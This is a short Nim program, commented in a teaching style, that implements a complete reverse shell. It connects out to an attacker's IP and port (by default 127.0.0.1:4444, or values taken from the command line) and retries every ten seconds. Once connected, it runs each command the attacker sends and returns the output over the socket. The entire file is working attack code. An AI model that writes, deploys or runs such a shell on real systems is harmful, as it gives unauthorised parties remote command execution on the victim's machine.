import net
import osproc # This comes with execProcess, which returns the output of the command as a string
import os
import strutils

# These are the default connection parameters for the reverse shell, but can be overwritten with command-line args
var ip = "127.0.0.1"
var port = 4444

# Get the command line arguments
var args = commandLineParams() # Returns a sequence (similar to a Python list) of the CLI arguments

# If arguments have been provided, assume they are an IP and port and overwrite the default IP/port values
if args.len() == 2:
    ip = args[0]
    port = parseInt(args[1])

# Begin by creating a new socket
var socket = newSocket()
echo "Attempting to connect to ", ip, " on port ", port, "..."

# Main loop to keep trying to connect
while true:
    # Attempt to connect to the attacker's host
    try:
        socket.connect(ip, Port(port))
        
        # If the connection succeeds, begin the logic for receiving and executing commands from the attacker
        while true:
            try:
                socket.send("> ")
                var command = socket.recvLine() # Read in a line from the attacker, which should be a shell command to execute
                var result = execProcess(command) # execProcess() returns the output of a shell command as a string
                socket.send(result) # Send the results of the command to the attacker
            
            # If the attacker forgets they're in a reverse shell and tries to ctrl+c, which they inevitably will, close the socket and quit the program    
            except:
                echo "Connection lost, quitting..."
                socket.close()
                system.quit(0)

    # If the connection fails, wait 10 seconds and try again        
    except:
        echo "Failed to connect, retrying in 10 seconds..."
        sleep(10000) # Note that sleep() takes its argument in milliseconds, at least by default
        continue
